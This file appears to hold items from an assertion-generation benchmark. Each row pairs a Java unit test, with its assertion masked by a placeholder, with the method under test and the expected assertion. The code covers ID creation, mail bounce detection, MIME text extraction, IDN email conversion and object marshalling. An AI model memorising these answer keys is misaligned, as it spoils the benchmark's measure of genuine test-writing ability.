"testCreateFixtureUuId() { UUID uuid = UUID.fromString(""144a0317-8cb5-40b2-981f-1fae0781715f""); FixtureUuId id = BEANS.get(IdFactory.class).createInternal(FixtureUuId.class, uuid); ""<AssertPlaceHolder>""; }
createInternal(Class<ID> idClass, Object... values) { try { Method createMethod = lookupCreateMethod(idClass); return idClass.cast(createMethod.invoke(null, values)); } catch (Exception e) { throw BEANS.get(PlatformExceptionTranslator.class).translate(e) .withContextInfo(""idClass"", idClass.getName()) .withContextInfo(""values"", Arrays.toString(values)); } }"	assertEquals(uuid, id.unwrap())
"testCreateFixtureLongId() { Long value = Long.valueOf(42); FixtureLongId id = BEANS.get(IdFactory.class).createInternal(FixtureLongId.class, value); ""<AssertPlaceHolder>""; }
createInternal(Class<ID> idClass, Object... values) { try { Method createMethod = lookupCreateMethod(idClass); return idClass.cast(createMethod.invoke(null, values)); } catch (Exception e) { throw BEANS.get(PlatformExceptionTranslator.class).translate(e) .withContextInfo(""idClass"", idClass.getName()) .withContextInfo(""values"", Arrays.toString(values)); } }"	assertEquals(value, id.unwrap())
"testEnumTextResolver() { ""<AssertPlaceHolder>""; }
enumTextResolver() { return e -> e == null ? null : e.text(); }"	assertNull(LookupHelper.enumTextResolver().apply(null))
"testParse() { DoEntity entity = s_testHelper.parse(JSON, DoEntity.class); ""<AssertPlaceHolder>""; }
parse(String json, Class<T> valueType) { return s_dataObjectMapper.get().readValue(json, valueType); }"	assertEqualsWithComparisonFailure(s_entity, entity)
"testCloneT() { ""<AssertPlaceHolder>""; }
clone(T dataObject) { return s_dataObjectHelper.get().clone(dataObject); }"	assertEqualsWithComparisonFailure(s_entity, s_testHelper.clone(s_entity))
"testNoBounce() { MailMessage mailMessage = BEANS.get(MailMessage.class) .withSubject(""lorem"") .withSender(BEANS.get(MailParticipant.class).withEmail(""sender@example.org"")) .addToRecipient(BEANS.get(MailParticipant.class).withEmail(""recipient@example.org"")) .withBodyPlainText(""Lorem ipsum"");  ""<AssertPlaceHolder>""; }
test(MimeMessage mimeMessage) { Assertions.assertNotNull(mimeMessage, ""Mime message must be set"");  if (checkIsDsnBounce(mimeMessage)) { return true; } if (checkIsNonStandardBounce(mimeMessage)) { return true; }  return false; }"	assertFalse(BEANS.get(MailBounceDetector.class).test(BEANS.get(MailHelper.class).createMimeMessage(mailMessage)))
"MessagingException { MailMessage mailMessage = BEANS.get(MailMessage.class) .withSubject(""lorem"") .withSender(BEANS.get(MailParticipant.class).withEmail(""postmaster@example.org"")) .addToRecipient(BEANS.get(MailParticipant.class).withEmail(""recipient@example.org"")) .withBodyPlainText(""Lorem ipsum"");  // only sender criteria matches (still two missing) MimeMessage mimeMessage = BEANS.get(MailHelper.class).createMimeMessage(mailMessage); mimeMessage.addHeader(""Return-Path"", ""sender@example.org""); ""<AssertPlaceHolder>""; }
test(MimeMessage mimeMessage) { Assertions.assertNotNull(mimeMessage, ""Mime message must be set"");  if (checkIsDsnBounce(mimeMessage)) { return true; } if (checkIsNonStandardBounce(mimeMessage)) { return true; }  return false; }"	assertFalse(BEANS.get(MailBounceDetector.class).test(mimeMessage))
"MessagingException { MailMessage mailMessage = BEANS.get(MailMessage.class) .withSubject(""undeliverable"") .withSender(BEANS.get(MailParticipant.class).withEmail(""sender@example.org"")) .addToRecipient(BEANS.get(MailParticipant.class).withEmail(""recipient@example.org"")) .withBodyPlainText(""Lorem ipsum"");  // only subject criteria matches (still two missing) MimeMessage mimeMessage = BEANS.get(MailHelper.class).createMimeMessage(mailMessage); mimeMessage.addHeader(""Return-Path"", ""sender@example.org""); ""<AssertPlaceHolder>""; }
test(MimeMessage mimeMessage) { Assertions.assertNotNull(mimeMessage, ""Mime message must be set"");  if (checkIsDsnBounce(mimeMessage)) { return true; } if (checkIsNonStandardBounce(mimeMessage)) { return true; }  return false; }"	assertFalse(BEANS.get(MailBounceDetector.class).test(mimeMessage))
"MessagingException { MailMessage mailMessage = BEANS.get(MailMessage.class) .withSubject(""undeliverable"") .withSender(BEANS.get(MailParticipant.class).withEmail(""postmaster@example.org"")) .addToRecipient(BEANS.get(MailParticipant.class).withEmail(""recipient@example.org"")) .withBodyPlainText(""Lorem ipsum"");  // only subject and sender criteria matches (still one missing) MimeMessage mimeMessage = BEANS.get(MailHelper.class).createMimeMessage(mailMessage); mimeMessage.addHeader(""Return-Path"", ""sender@example.org""); ""<AssertPlaceHolder>""; }
test(MimeMessage mimeMessage) { Assertions.assertNotNull(mimeMessage, ""Mime message must be set"");  if (checkIsDsnBounce(mimeMessage)) { return true; } if (checkIsNonStandardBounce(mimeMessage)) { return true; }  return false; }"	assertFalse(BEANS.get(MailBounceDetector.class).test(mimeMessage))
"testNonStandardBounceSubjectSenderReturnPath() { MailMessage mailMessage = BEANS.get(MailMessage.class) .withSubject(""undeliverable"") .withSender(BEANS.get(MailParticipant.class).withEmail(""postmaster@example.org"")) .addToRecipient(BEANS.get(MailParticipant.class).withEmail(""recipient@example.org"")) .withBodyPlainText(""undeliverable"");  // sender, subject and return path criteria matches (reached 3 criterias to detect as bounce) ""<AssertPlaceHolder>""; }
test(MimeMessage mimeMessage) { Assertions.assertNotNull(mimeMessage, ""Mime message must be set"");  if (checkIsDsnBounce(mimeMessage)) { return true; } if (checkIsNonStandardBounce(mimeMessage)) { return true; }  return false; }"	assertTrue(BEANS.get(MailBounceDetector.class).test(BEANS.get(MailHelper.class).createMimeMessage(mailMessage)))
"MessagingException { MimeMessage mimeMessage = createMimeMessageUsingUnknownEncoding(); Assert.""<AssertPlaceHolder>""; }
getPlainText(Part message) { List<Part> bodyParts = getBodyParts(message); Part plainTextPart = getPlainTextPart(bodyParts); return readContentAsString(plainTextPart); }"	"assertEquals(""a"", BEANS.get(MailHelper.class).getPlainText(mimeMessage))"
"MessagingException { MailMessage mailMessage = BEANS.get(MailMessage.class) .withBodyPlainText(""lorem"");  MimeMessage message = BEANS.get(MailHelper.class).createMimeMessage(mailMessage); BEANS.get(MailHelper.class).ensureFromAddress(message, null);  ""<AssertPlaceHolder>""; }
ensureFromAddress(MimeMessage message, String defaultFromEmail) { try { Address[] fromAddresses = message.getFrom(); if (fromAddresses != null && fromAddresses.length != 0) { // From address is already set return; }  if (StringUtility.hasText(defaultFromEmail)) { message.setFrom(createInternetAddress(defaultFromEmail)); } } catch (MessagingException e) { throw new ProcessingException(""Couldn't apply 'default from' to message"", e); } }"	"assertNull(""No 'from'"", message.getFrom())"
"testGetPlainText() { MailHelper mailHelper = BEANS.get(MailHelper.class);  MimeMessage mimeMessage = mailHelper.createMimeMessage(BEANS.get(MailMessage.class).withBodyPlainText(""plain text body\näpfel\nŻółw"").withBodyHtml(""<html><body>html body<br>äpfel<br>Żółw<body></html>"")); ""<AssertPlaceHolder>""; }
getPlainText(Part message) { List<Part> bodyParts = getBodyParts(message); Part plainTextPart = getPlainTextPart(bodyParts); return readContentAsString(plainTextPart); }"	"assertEquals(""plain text body\näpfel\nŻółw"", mailHelper.getPlainText(mimeMessage))"
"testGetHtmlBody() { MailHelper mailHelper = BEANS.get(MailHelper.class);  MimeMessage mimeMessage = mailHelper.createMimeMessage(BEANS.get(MailMessage.class).withBodyPlainText(""plain text body\näpfel\nŻółw"").withBodyHtml(""<html><body>html body<br>äpfel<br>Żółw<body></html>"")); ""<AssertPlaceHolder>""; }
getHtmlBody(Part message) { List<Part> bodyParts = getBodyParts(message); Part htmlPart = getHtmlPart(bodyParts); return readContentAsString(htmlPart); }"	"assertEquals(""<html><body>html body<br>äpfel<br>Żółw<body></html>"", mailHelper.getHtmlBody(mimeMessage))"
"testEmptyContentDisposition() { String eml = """" + ""To: lorem@exampleorg\n"" + ""From: ipsum@example.org\n"" + ""MIME-Version: 1.0\n"" + ""Content-Type: text/plain; charset=utf-8\n"" + ""Content-Disposition: \n"" + ""Content-Transfer-Encoding: 7bit\n"" + ""\n"" + ""Lorem"";  MailHelper helper = BEANS.get(MailHelper.class); MimeMessage message = helper.createMessageFromBytes(eml.getBytes(StandardCharsets.UTF_8)); ""<AssertPlaceHolder>""; // failed with jakarta.mail.internet.ParseException: Expected disposition, got null }
getPlainText(Part message) { List<Part> bodyParts = getBodyParts(message); Part plainTextPart = getPlainTextPart(bodyParts); return readContentAsString(plainTextPart); }"	"assertEquals(""Lorem"", helper.getPlainText(message))"
"testAsciiConvertionWithoutSpecialChar() { // Arrange String emailAddress = ""someone@example.com"";  // Act String convertedAddress = BEANS.get(MailIDNConverter.class).toASCII(emailAddress);  // Assert ""<AssertPlaceHolder>""; }
toASCII(String email) { return convertToCharset(email, IDN::toASCII); }"	assertEquals(emailAddress, convertedAddress)
"testAsciiConvertionWithSpecialCharInLocalPart() { // Arrange String emailAddress = ""sömeöne@example.com"";  // Act String convertedAddress = BEANS.get(MailIDNConverter.class).toASCII(emailAddress);  // Assert ""<AssertPlaceHolder>""; }
toASCII(String email) { return convertToCharset(email, IDN::toASCII); }"	assertEquals(emailAddress, convertedAddress)
"testAsciiConvertionWithSpecialChar() { // Arrange String emailAddress = ""sömeone@exämple.com""; String punycodeAddress = ""sömeone@xn--exmple-cua.com"";  // Act String convertedAddress = BEANS.get(MailIDNConverter.class).toASCII(emailAddress);  // Assert ""<AssertPlaceHolder>""; }
toASCII(String email) { return convertToCharset(email, IDN::toASCII); }"	assertEquals(punycodeAddress, convertedAddress)
"testUnicodeConvertionWithSpecialChar() { // Arrange String punycodeAddress = ""sömeöne@xn--exmple-cua.com""; String emailAddress = ""sömeöne@exämple.com"";  // Act String convertedAddress = BEANS.get(MailIDNConverter.class).toUnicode(punycodeAddress);  // Assert ""<AssertPlaceHolder>""; }
toUnicode(String email) { return convertToCharset(email, IDN::toUnicode); }"	assertEquals(emailAddress, convertedAddress)
"testEmpty() { Map<String, String> context = new HashMap<>();  String jsonText = (String) BEANS.get(JsonDataObjectMarshaller.class).marshall(BEANS.get(DoEntity.class), context); ""<AssertPlaceHolder>""; }
unmarshall(final Object data, final Map<String, String> context) { return m_dataObjectMapper.readValue(assertType(data, String.class), IDataObject.class); }"	assertEquals(BEANS.get(DoEntity.class), BEANS.get(JsonDataObjectMarshaller.class).unmarshall(jsonText, context))
"testNull() { Map<String, String> context = new HashMap<>();  String jsonText = (String) BEANS.get(JsonDataObjectMarshaller.class).marshall(null, context); ""<AssertPlaceHolder>""; }
unmarshall(final Object data, final Map<String, String> context) { return m_dataObjectMapper.readValue(assertType(data, String.class), IDataObject.class); }"	assertNull(BEANS.get(JsonDataObjectMarshaller.class).unmarshall(jsonText, context))
"testNotSerializableObject() { Map<String, String> context = new HashMap<>(); try { BEANS.get(ObjectMarshaller.class).marshall(new Object(), context); fail(""NotSerializableException expected""); } catch (Exception e) { MatcherAssert.""<AssertPlaceHolder>""; } }
marshall(final Object transferObject, final Map<String, String> context) { if (transferObject == null) { return null; }  try { final IObjectSerializer serializer = SerializationUtility.createObjectSerializer(); final byte[] bytes = serializer.serialize(transferObject);  context.put(CTX_PROP_OBJECT_TYPE, transferObject.getClass().getName()); return bytes; } catch (final IOException e) { throw BEANS.get(DefaultRuntimeExceptionTranslator.class).translate(e); } }"	assertThat(e.getCause(), is(instanceOf(NotSerializableException.class)))
"testEmpty() { ObjectMarshaller marshaller = BEANS.get(ObjectMarshaller.class); Map<String, String> context = new HashMap<>();  byte[] bytes = (byte[]) marshaller.marshall("""", context); ""<AssertPlaceHolder>""; }
unmarshall(final Object data, final Map<String, String> context) { final byte[] bytes = (byte[]) data; if (bytes == null) { return null; }  try { final Class<?> objectType = Class.forName(context.get(CTX_PROP_OBJECT_TYPE)); final IObjectSerializer serializer = SerializationUtility.createObjectSerializer(); return serializer.deserialize(bytes, objectType); } catch (final IOException | ClassNotFoundException e) { throw BEANS.get(DefaultRuntimeExceptionTranslator.class).translate(e); } }"	"assertEquals("""", marshaller.unmarshall(bytes, context))"
"testNull() { ObjectMarshaller marshaller = BEANS.get(ObjectMarshaller.class); Map<String, String> context = new HashMap<>();  byte[] bytes = (byte[]) marshaller.marshall(null, context); ""<AssertPlaceHolder>""; }
unmarshall(final Object data, final Map<String, String> context) { final byte[] bytes = (byte[]) data; if (bytes == null) { return null; }  try { final Class<?> objectType = Class.forName(context.get(CTX_PROP_OBJECT_TYPE)); final IObjectSerializer serializer = SerializationUtility.createObjectSerializer(); return serializer.deserialize(bytes, objectType); } catch (final IOException | ClassNotFoundException e) { throw BEANS.get(DefaultRuntimeExceptionTranslator.class).translate(e); } }"	assertNull(marshaller.unmarshall(bytes, context))
"testGetServiceHighestRanking() { ITestService service = BEANS.get(ITestService.class); ""<AssertPlaceHolder>""; }
get(Class<T> beanClazz) { return Assertions.assertNotNull(opt(beanClazz), ""no instance found for query: {}"", beanClazz); }"	"assertEquals(""Service with highest ranking expected."", TestService3.class, service.getClass())"
"testGetServiceNull() { IUnregisteredTestService service = BEANS.get(IUnregisteredTestService.class); ""<AssertPlaceHolder>""; }
get(Class<T> beanClazz) { return Assertions.assertNotNull(opt(beanClazz), ""no instance found for query: {}"", beanClazz); }"	"assertNull(""No service should be found. "", service)"
"testGetServicesNull() { List<IUnregisteredTestService> services = BEANS.all(IUnregisteredTestService.class); ""<AssertPlaceHolder>""; }
all(Class<T> beanClazz) { return all(beanClazz, null); }"	"assertEquals(""No services should be found. "", 0, services.size())"
"testSystemResolveProperty() { PropertiesHelper instance = new PropertiesHelper(new ConfigPropertyProvider(SAMPLE_CONFIG_PROPS)); final String attrOtherSystemPropertyKey = ""attrOtherSystemPropertyKey""; try { System.setProperty(ATTR_STRING_KEY, ""property ${"" + attrOtherSystemPropertyKey + ""}""); System.setProperty(attrOtherSystemPropertyKey, ""resolved"");  ""<AssertPlaceHolder>"";  System.setProperty(ATTR_STRING_KEY, ""property ${"" + ATTR_LONG_KEY + ""}""); System.setProperty(attrOtherSystemPropertyKey, ""property "" + 777); } finally { System.clearProperty(ATTR_STRING_KEY); System.clearProperty(attrOtherSystemPropertyKey); } }
getProperty(String key) { return getProperty(key, null); }"	"assertEquals(""property resolved"", instance.getProperty(ATTR_STRING_KEY))"
